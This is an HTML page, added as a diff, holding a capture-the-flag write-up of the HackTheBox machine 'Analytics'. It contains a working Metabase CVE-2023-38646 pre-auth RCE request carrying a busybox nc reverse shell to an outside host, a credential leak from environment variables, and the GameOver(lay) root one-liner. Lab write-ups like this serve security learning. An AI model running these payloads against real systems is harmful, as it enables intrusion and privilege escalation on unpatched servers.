@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/analytics.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Analytics - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Analytics</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Analytics</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">metabase 0.46.6 pre-auth rce (cve-2023-38646)</span>
+                    <span class="tag">leaked setup-token</span>
+                    <span class="tag">h2 jdbc init trigger rce</span>
+                    <span class="tag">container env credential leak</span>
+                    <span class="tag">gameover(lay) ubuntu lpe (cve-2023-2640 / cve-2023-32629)</span>
+                </div>
+
+                <img src="../../images/hackthebox/analytics/index.png" alt="Analytics Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Only SSH on 22 and nginx on 80, and port 80 redirects to <code>analytical.htb</code>, so that goes into <code>/etc/hosts</code>.</p>
+
+                <pre><code>[analytics] nmap -Pn -v -T5 --min-rate 2000 -oN nmap -sSVC -p- 10.129.229.224
+Nmap scan report for 10.129.229.224
+Host is up (0.15s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://analytical.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The landing page is a marketing site for "Analytical", and its <em>Login</em> button points at <code>http://data.analytical.htb</code>, a second virtual host, so I added that to <code>/etc/hosts</code> as well.</p>
+
+                <pre><code>[analytics] curl -s http://analytical.htb | grep .htb
+&lt;a class="nav-item nav-link" href="http://data.analytical.htb"&gt;Login&lt;/a&gt;</code></pre>
+
+                <p>The login subdomain is a <strong>Metabase</strong> instance. Curling the page and grepping for the version string pins it to <strong>0.46.6</strong>.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>Metabase 0.46.6 is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2023-38646">CVE-2023-38646</a>, a pre-authentication RCE. Metabase leaks a <code>setup-token</code> at <code>/api/session/properties</code> even after setup is complete. The <code>/api/setup/validate</code> endpoint lets an unauthenticated user test a database connection, and for the bundled <strong>H2</strong> engine the JDBC connection string accepts an <code>INIT</code> clause that runs arbitrary SQL. H2 in turn lets that SQL define a trigger whose body is Java, so a single validate request instantiates a trigger that calls <code>java.lang.Runtime.getRuntime().exec()</code>, which is full command execution before any login. I followed vulhub's writeup for this (<a href="https://github.com/vulhub/vulhub/blob/master/metabase/CVE-2023-38646/README.md">vulhub CVE-2023-38646</a>).</p>
+
+                <p>First grab the setup token:</p>
+
+                <pre><code>[analytics] curl -s http://data.analytical.htb/api/session/properties | grep -o '"setup-token":"[^"]*"'
+"setup-token":"249fa03d-fd94-4d5b-b94f-b4ebf3df681f"</code></pre>
+
+                <p>Then POST that token to <code>/api/setup/validate</code> with an H2 connection whose <code>init</code> creates a trigger that shells out. The trigger body is unicode-escaped in the JSON, but it reduces to a <code>busybox nc</code> reverse shell:</p>
+
+                <pre><code>POST /api/setup/validate HTTP/1.1
+Host: data.analytical.htb
+Content-Type: application/json
+
+{
+    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
+    "details": {
+        "details": {
+            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
+            "advanced-options": false,
+            "ssl": true,
+            "init": "CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('busybox nc 10.10.15.208 35337 -e sh')\n$$"
+        },
+        "name": "an-sec-research-team",
+        "engine": "h2"
+    }
+}</code></pre>
+
+                <p>Start a listener and fire the request. The trigger runs as soon as Metabase validates the connection and lands a shell as the <code>metabase</code> service account inside its container:</p>
+
+                <pre><code>[analytics] nc -lnvp 35337
+Listening on 0.0.0.0 35337
+Connection received on 10.129.229.224 43403
+id
+uid=2000(metabase) gid=2000(metabase) groups=2000(metabase)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>The shell is inside a container, so there is no flag here, but Metabase was configured with credentials passed as environment variables. <code>printenv</code> hands them over in cleartext:</p>
+
+                <pre><code>metabase@3fe207a5e92e:/$ printenv | grep META
+META_USER=metalytics
+META_PASS=An4lytics_ds20223#</code></pre>
+
+                <p>That account is reused for a real system user, so it is a straight SSH login to the host for the user flag:</p>
+
+                <pre><code>[analytics] ssh metalytics@analytical.htb
+metalytics@analytics:~$ id
+uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
+metalytics@analytics:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>The kernel is the tell. <code>uname -a</code> shows a vulnerable Ubuntu build:</p>
+
+                <pre><code>metalytics@analytics:~$ uname -a
+Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC ... x86_64 GNU/Linux</code></pre>
+
+                <p>This kernel is affected by <strong>GameOver(lay)</strong>, <a href="https://www.cve.org/CVERecord?id=CVE-2023-2640">CVE-2023-2640</a> and <a href="https://www.cve.org/CVERecord?id=CVE-2023-32629">CVE-2023-32629</a>, a flaw in Ubuntu's OverlayFS. An unprivileged user can create an overlay mount inside a user namespace and set file capabilities on the upper layer that are honoured on the real filesystem, so a capability like <code>cap_setuid</code> can be smuggled onto a binary we control. The overlay module is loaded, so the box is exploitable:</p>
+
+                <pre><code>metalytics@analytics:~$ lsmod | grep overlay
+overlay               188416  1</code></pre>
+
+                <p>The public one-liner copies <code>python3</code> into the overlay's lower dir, grants it <code>cap_setuid</code>, mounts the overlay, and touches the file so the capability lands on the merged copy. That capable Python then calls <code>setuid(0)</code> and spawns a root shell:</p>
+
+                <pre><code>metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;
+&gt; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;" &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+root@analytics:~# id
+uid=0(root) gid=1000(metalytics) groups=1000(metalytics)</code></pre>
+
+                <p>Effective UID 0, so it is just reading <code>/root/root.txt</code>.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Analytics</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
